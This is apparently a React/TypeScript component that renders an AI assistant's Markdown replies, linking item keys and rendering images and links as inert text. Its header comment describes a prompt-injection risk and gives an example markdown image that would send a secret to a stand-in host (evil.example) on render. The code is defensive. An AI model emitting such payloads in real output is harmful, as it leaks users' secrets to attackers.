/*
 * Assistant replies as Markdown (@tanstack/markdown, raw HTML off). Two rules beyond the defaults:
 *
 * - CP-1234 in text becomes a link to the review screen (an inline component, so it works inside emphasis
 *   and never inside code or an existing link).
 * - Nothing the model writes can make the browser fetch or open a URL: images render as their alt text and
 *   links as "label (address)". The assistant reads partner-supplied copy, so an injected
 *   `![x](https://evil.example/?d=<secret>)` would otherwise exfiltrate on render.
 */
import type { InlineNode, MarkdownExtension } from '@tanstack/markdown';
import { Markdown } from '@tanstack/markdown/react';
import type { MarkdownComponents } from '@tanstack/markdown/react';
import { Link } from '@tanstack/react-router';
import type { ReactNode } from 'react';

const ITEM_KEY = /\bCP-(\d+)\b/g;
const ITEM_LINK_TAG = 'cp-item-link';

function splitKeys(value: string): InlineNode[] {
  const nodes: InlineNode[] = [];
  let last = 0;
  for (const match of value.matchAll(ITEM_KEY)) {
    const start = match.index;
    if (start > last) nodes.push({ type: 'text', value: value.slice(last, start) });
    nodes.push({
      type: 'inlineComponent',
      name: 'item-link',
      tagName: ITEM_LINK_TAG,
      attributes: {},
      properties: { itemId: match[1] ?? '' },
      children: [{ type: 'text', value: match[0] }],
    });
    last = start + match[0].length;
  }
  if (last < value.length) nodes.push({ type: 'text', value: value.slice(last) });
  return nodes;
}

function linkItemKeys(nodes: InlineNode[]): InlineNode[] {
  return nodes.flatMap((node): InlineNode[] => {
    switch (node.type) {
      case 'text':
        return splitKeys(node.value);
      case 'strong':
      case 'emphasis':
      case 'strike':
        return [{ ...node, children: linkItemKeys(node.children) }];
      default:
        return [node]; // code spans, links (no nested anchors), images
    }
  });
}

const itemKeys: MarkdownExtension = { name: 'cp-item-keys', transformInline: linkItemKeys };
const EXTENSIONS = [itemKeys];

function ItemLink({ itemId, children }: { itemId?: string; children?: ReactNode }) {
  if (itemId === undefined || itemId === '') return <>{children}</>;
  return (
    <Link to="/items/$itemId" params={{ itemId }} className="app-assistant-item-link">
      {children}
    </Link>
  );
}

const COMPONENTS = {
  a: ({ href, children }) => (
    <span>
      {children}
      {href !== undefined && href !== '' && <span className="app-muted"> ({href})</span>}
    </span>
  ),
  img: ({ alt }) => <span>{alt}</span>,
  [ITEM_LINK_TAG]: ItemLink,
} satisfies MarkdownComponents;

export function AssistantMarkdown({ source }: { source: string }) {
  return (
    <div className="app-assistant-markdown">
      <Markdown extensions={EXTENSIONS} components={COMPONENTS}>
        {source}
      </Markdown>
    </div>
  );
}
